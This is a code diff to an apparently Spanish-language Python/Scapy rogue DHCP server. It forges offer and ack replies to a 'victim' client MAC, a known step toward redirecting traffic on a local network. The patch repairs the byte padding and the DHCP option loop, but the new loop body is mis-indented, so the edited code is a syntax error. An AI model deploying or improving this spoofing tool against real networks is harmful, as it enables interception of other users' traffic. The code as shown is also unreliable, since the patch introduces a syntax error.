@@ -134,7 +134,7 @@ def armar_respuesta(pkt, tipo, mi_ip, ip_offer, mascara, lease, mi_mac, interfac
         xid = pkt[BOOTP].xid,
         yiaddr = ip_offer,
         siaddr = mi_ip,
-        chaddr = bytes.fromhex(mac_victima.replace(":", ""))+b'/x00'*10
+        chaddr = bytes.fromhex(mac_victima.replace(":", ""))+b'\x00'*10
     )
     message_value = "offer" if tipo == 1 else "ack"
     dhcp_field = DHCP(
@@ -164,11 +164,12 @@ def procesar_pkt(pkt, mi_ip, ip_offer, mascara, lease, mi_mac, interface):
         return
 
     dhcp_data = pkt[DHCP].options
-    for opt in dhcp_data.options:
-        if isinstance(dhcp_data, tuple) and dhcp_data[0] == 'message-type':
-            dora = dhcp_data[1]
-            if dora == 1 or dora ==3:
-                armar_respuesta(pkt, dora, mi_ip, ip_offer, mascara, lease, mi_mac, interface)
+    for opt in dhcp_data:
+    if isinstance(opt, tuple) and opt[0] == 'message-type':
+        dora = opt[1]
+        if dora in (1, 3):
+            armar_respuesta(pkt, dora, mi_ip, ip_offer, mascara, lease, mi_mac, interface)
+            return
 
     return
 
